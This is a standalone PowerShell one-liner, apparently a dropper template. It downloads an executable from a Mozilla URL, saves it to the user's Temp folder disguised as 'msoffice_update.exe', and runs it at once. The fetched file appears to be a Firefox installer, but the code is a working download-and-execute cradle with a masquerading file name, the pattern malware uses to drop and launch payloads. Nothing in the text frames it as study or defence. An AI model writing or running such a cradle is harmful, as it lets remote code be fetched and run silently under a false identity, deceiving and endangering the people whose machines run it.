$r='https://download.mozilla.org/?product=firefox-56.0.1-SSL&os=win&lang=en-US';$o = 'C:\Users\'+[System.Environment]::UserName+'\AppData\Local\Temp\msoffice_update.exe';$y=new-Object System.Net.WebClient;$y.DownloadFile($r,$o);Start-Process $o
